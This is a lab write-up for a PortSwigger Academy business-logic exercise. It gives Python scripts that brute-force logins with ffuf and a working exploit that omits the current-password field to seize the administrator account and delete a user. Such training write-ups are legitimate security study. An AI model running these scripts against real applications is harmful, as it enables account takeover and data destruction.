--- 
title: "Weak Isolation on Dual Use Endpoint"
author: ""
date: 2024-06-01T18:05:22+01:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
#### Entities
Asset: https://0a6900f304316c31819ecf1d004200a6.web-security-academy.net

#### Enumeration
Access the lab, add the domain to Burp's Target scope and check `Include subdomains`. View `/` route source page and inspect the page, then request all embedded links via Burp proxy using the scripts below.

```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import platform
import subprocess
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_session_cookie(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
  session_cookie = response.cookies.get('session')
  return csrf_token, session_cookie

def check_binary(binary_name):
  if sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
    command = ['which', binary_name]
  elif sys.platform.startswith('win'):
    command = ['where', binary_name]
  else:
    print("Unsupported operating system")
    return

  try:
    subprocess.check_output(command)
    return True
  except subprocess.CalledProcessError:
    print(f"{binary_name} is not installed.")
    return False

def install_binary(binary_url, binary_name):
  os_name = platform.system().lower()
  binary_file = f"{binary_name}.zip" if os_name == 'windows' else f"{binary_name}.tar.gz"
  
  # Check if binary exists
  if not check_binary(binary_name):
    # Download Binary File if not exist
    if not os.path.exists(binary_file):
      if os_name == 'linux':
        download_command = f"curl -L {binary_url}_linux_amd64.tar.gz -o {binary_file}"
      elif os_name == 'darwin':
        download_command = f"curl -L {binary_url}_macOS_amd64.tar.gz -o {binary_file}"
      elif sys.platform.startswith('win'):
        download_command = f"powershell -Command 'Invoke-WebRequest {binary_url}_windows_amd64.zip -OutFile {binary_file}'"
      else:
        print("Unsupported operating system")
        return

      try:
        subprocess.run(download_command, shell=True, check=True)
        print(f"{binary_name} downloaded successfully")
      except subprocess.CalledProcessError as e:
        print(f"Failed to download {binary_name}: {e}")

    # Install Binary
    if os.path.exists(binary_file):
      if os_name in ['linux', 'darwin']:
        extract_command = f"sudo tar -C /usr/local/bin/ -xzf {binary_file} {binary_name} && sudo chmod 775 /usr/local/bin/{binary_name}"
      elif sys.platform.startswith('win'):
        extract_command = f"Powershell -Command \"Expand-Archive -Path {binary_file} -DestinationPath . ; Move-Item -Path .\\{binary_name}.exe -Destination 'C:\\Windows\\'\""
      else:
        print("Unsupported operating system")
        return

      try:
        subprocess.run(extract_command, shell=True, check=True)
        print(f"{binary_name} installed successfully")
      except subprocess.CalledProcessError as e:
        print(f"Failed to install {binary_name}: {e}")

        # Clean up downloaded binary file
        try:
          cleanup_command = f"rm {binary_file}" if os_name != 'windows' else f"del {binary_file}"
          subprocess.run(cleanup_command, shell=True, check=True)
          print(f"Cleaned up {binary_file}")
        except subprocess.CalledProcessError as e:
          print(f"Failed to clean up {binary_file}: {e}")
  else:
    print(f"{binary_name} is already installed.")

def enumerate(endpoint, wordlist_path, method='GET', data=None, session_cookie=None, fuzz_mode=None):
  print("Enumerating paths...")
  if method == 'GET':
    fuzz_command = f"ffuf -s -u {endpoint} -w {wordlist_path} -x http://127.0.0.1:8080"
  elif method == 'POST':
    if data is None:
      print("Data must be provided for POST method")
      return
    fuzz_command = f"ffuf -s --mode {fuzz_mode} -u {endpoint} {' '.join('-w ' + path for path in wordlist_path)} -X POST -d {data} -b session={session_cookie} -x http://127.0.0.1:8080 -mc 302,401-403"
  else:
    print("Unsupported method")
    return

  process = subprocess.Popen(fuzz_command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
  for line in process.stdout:
    print(line.strip())

def main():
  binary_url = "https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0"
  binary_name = "ffuf"
  base_url = "https://0a6900f304316c31819ecf1d004200a6.web-security-academy.net"
  install_binary(binary_url, binary_name)
  session = requests.Session()
  csrf_token, session_cookie = get_csrf_session_cookie(session, base_url + '/login')
  enumerate(base_url + '/FUZZ', 'wordlist_for_paths.txt')
  enumerate(base_url + '/login', ['wordlist_for_users.txt:USERNAME', 'wordlist_for_passwords.txt:PASSWORD'], method='POST', data=f'csrf={csrf_token}&username=USERNAME&password=PASSWORD', session_cookie=session_cookie, fuzz_mode='clusterbomb')
  
if __name__ == "__main__":
  main()
```
The custom word list used for the path enumeration.
```text
accounts
admin
administrator
api
users
products
product
```
The custom word list used for the username enumeration.
```text
administrator
alex
ben
carlos
jane
micheal
peter
```
The custom word list used for the password enumeration.
```text
administrator
alex
ben
carlos
jane
micheal
peter
```
![Enumeration](/images/bizlogic7/01-enumerate-weak-isolation-on-dual-use-endpoint.png "Enumeration")  

#### Exploration
Stacking BurpSuite and the Browser with FoxyProxy extension for Burp turned on, explore the application by logging into the application using the given credential `wiener:peter`. A random test revealed that the username can be updated to another user from the current user. 

![Exploration](/images/bizlogic7/02-explore-weak-isolation-on-dual-use-endpoint.png "Exploration") 

#### Exploitation
Send that to Burp's Repeater and repeat updating the user to administrator and bypassing the current password box activated the 'Admin Panel' after logging in with the updated credential. Click on it then delete the Carlos user. This exploit can be automated with the script below
```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define Proxies
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Get CSRF Token
def get_csrf_token(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
  return csrf_token

def exploit(session, base_url):
  login_url = urljoin(base_url, '/login')
  login_csrf_token = get_csrf_token(session, login_url)
  login_payload = {'username': 'wiener', 'password': 'peter', 'csrf': login_csrf_token}
  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)
  if login_response.status_code == 200:
    account_url = base_url + '/my-account'
    change_password_url = base_url + '/my-account/change-password'
    csrf_token = get_csrf_token(session, account_url)
    data = {
      'username': 'administrator',
      'new-password-1': '4l@w3)',
      'new-password-2': '4l@w3)',
      'csrf': csrf_token
    }
    response = session.post(change_password_url, data=data, verify=False)
    if response.status_code == 200:
      # Call delete_user function
      delete_user(session, base_url, 'carlos')
      print("Carlos User Deleted!")
    else:
      print("Failed to delete Carlos User")
  else:
    print("Failed to log in.")

def delete_user(session, base_url, username):
  login_url = urljoin(base_url, '/login')
  login_csrf_token = get_csrf_token(session, login_url)
  login_payload = {'username': 'administrator', 'password': '4l@w3)', 'csrf': login_csrf_token}
  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)
  if login_response.status_code == 200:
    admin_delete_url = base_url + f'/admin/delete?username={username}'
    response = session.get(admin_delete_url, verify=False)
    return response

def main():
  base_url = 'https://0a6900f304316c31819ecf1d004200a6.web-security-academy.net'
  session = requests.Session()
  exploit(session, base_url)

if __name__ == "__main__":
  main()
```
![Exploitation](/images/bizlogic7/03-exploit-weak-isolation-on-dual-use-endpoint.png "Exploitation") 

![Solution](/images/bizlogic7/04-lab-solution.png "Solution")   

#### Resources
- https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint
- https://github.com/knoxknot/portswigger/tree/main/business-logic/07-weak-isolation-on-dual-use-endpoint